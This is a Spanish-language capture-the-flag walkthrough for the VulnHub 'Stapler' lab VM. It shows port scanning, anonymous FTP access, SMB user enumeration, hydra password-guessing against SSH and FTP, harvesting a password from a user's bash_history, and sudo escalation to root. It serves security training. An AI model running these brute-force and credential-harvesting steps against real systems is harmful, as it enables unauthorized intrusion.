# STAPLER
Desarrollo del CTF STAPLER
Download: https://www.vulnhub.com/entry/stapler-1,150/

# Importante
Al descargar la VM e intentar utilizarla con VMWARE WORKSTATION 16 no funcionó (nunca super el motivo). La abrí con VIRTUALBOX y la exporte a un OVA para poder abrirlo con VMWARE.

## Escaneo de Puertos

### 1. Escaneamos todos los puertos TCP

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 192.168.78.140
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.78.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 8
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, ODBCClient, LongColumnFlag, Support41Auth, IgnoreSigpipes, SupportsCompression, SupportsTransactions, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsLoadDataLocal, LongPassword, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: gbz4\x0FZ\x10\x7Fes\x1D\x19<{@\x1C	\x15	\x06
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:5F:C6:18 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2021-02-23T16:39:50+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-23T16:39:49
|_  start_date: N/A
```

## Explotando Vulnerabilidades: Método 01 (propio)

Esta VM tiene mucho métodos para explotar, primero explicaré el que yo utilicé y luego los siguientes son métodos que luego leí de resolución.

### 1. Enumerar toda la información posible en cada servicio.

#### Puerto TCP/21 FTP
```
* El escaneo con NMAP indica que tenemos acceso anónimo
* Dentro hay un archivo llamado "note", toca revisar el mensaje.
root@kali:~/STAPLER# ftp 192.168.78.140
Connected to 192.168.78.140.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.78.140:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler1.jpg" width="80%"></img>

Importante: En el archivo no hay nada importante, aunque encontramos 02 nombres: Elly, John.

#### Puerto TCP/139 NETBIOS
```
Utilizamos la herramienta ENUM4LINUX: https://tools.kali.org/information-gathering/enum4linux
Debido a que el resultado es muy largo, sólo colocaré el resultado mas importante

root@kali:~/STAPLER# enum4linux -a 192.168.78.140 > enum4linux.txt
[+] Attempting to map shares on 192.168.78.140
//192.168.78.140/print$	Mapping: DENIED, Listing: N/A
//192.168.78.140/kathy	Mapping: OK, Listing: OK
//192.168.78.140/tmp	Mapping: OK, Listing: OK
//192.168.78.140/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler2.jpg" width="80%"></img>


### 2. Cracking ONLINE: ataque de diccionario

Utilizamos todos los usuarios que hemos identificado para tratar de acceder por FTP, SSH y MYSQL.
Yo siempre pruebo usuario = contraseña.
```
hydra -t 4 -L ntbusers.txt -P ntbusers.txt ftp://192.168.78.140
hydra -t 4 -L ntbusers.txt -P ntbusers.txt ssh://192.168.78.140
```
Importante: Luego aprendí que con la opción "-e" se puede hacer esto: -e nsr  try "n" null password, "s" login as pass and/or "r" reversed login

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler3.jpg" width="80%"></img>

Ganamos acceso a través de SSH con el usuario: SHayslett

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler4.jpg" width="80%"></img>


### 3. Elevar privilegios
1. Leemos archivos importantes dentro del directorio /home/. He leido todos los archivos BASH_HISTORY y notamos dos cosas:
- Tenemos acceso a los archivos de todos los usuarios, menos del usuario "peter"
- El archivo bash_history del usuario JKNODE tiene el passwrd del usuario "peter"

```
SHayslett@red:/home$ grep -rin . | grep bash_history
peter/.viminfo: Permission denied
grep: peter/.bash_history: Permission denied
grep: peter/.cache: Permission denied
SHayslett/.bash_history:1:exit
JKanode/.bash_history:1:id
JKanode/.bash_history:2:whoami
JKanode/.bash_history:3:ls -lah
JKanode/.bash_history:4:pwd
JKanode/.bash_history:5:ps aux
JKanode/.bash_history:6:sshpass -p thisimypassword ssh JKanode@localhost
JKanode/.bash_history:7:apt-get install sshpass
JKanode/.bash_history:8:sshpass -p JZQuyIN5 peter@localhost
JKanode/.bash_history:9:ps -ef
JKanode/.bash_history:10:top
JKanode/.bash_history:11:kill -9 3747
JKanode/.bash_history:12:exit
JKanode/.bash_history:13:ls
JKanode/.bash_history:14:ls -la
JKanode/.bash_history:15:ssh peter@localhost
JKanode/.bash_history:16:ls
JKanode/.bash_history:17:exi
JKanode/.bash_history:18:exit
```
<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler5.jpg" width="80%"></img>

2. Ingresamos con el usuario PETER.

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler6.jpg" width="80%"></img>

3. Elevamos privilegios a través de SUDO. El usuario tiene privilegios de root sin credenciales. 

```
red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```
4. Ganamos acceso como root.

<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler7.jpg" width="80%"></img>









